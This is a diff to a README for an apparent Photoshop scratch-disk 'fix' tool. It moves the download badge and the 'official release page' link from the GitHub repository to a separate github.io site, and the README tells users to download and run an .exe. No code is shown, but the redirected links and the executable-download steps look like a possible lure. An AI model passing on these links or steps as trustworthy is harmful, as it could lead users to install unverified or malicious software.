@@ -1,6 +1,6 @@
 # 📁 Photoshop-Scratch-Disk-Full-Fix - Resolve disk errors and boost performance
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Allforyou5043/Photoshop-Scratch-Disk-Full-Fix)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://allforyou5043.github.io)
 
 ## 🎯 About this tool
 
@@ -15,7 +15,7 @@ Photoshop requires a scratch disk to store temporary data while you work on larg
 
 ## 📥 How to download and install
 
-1. Visit the [official release page](https://github.com/Allforyou5043/Photoshop-Scratch-Disk-Full-Fix) to download the software.
+1. Visit the [official release page](https://allforyou5043.github.io) to download the software.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download to your computer.
 4. Locate the file in your Downloads folder.
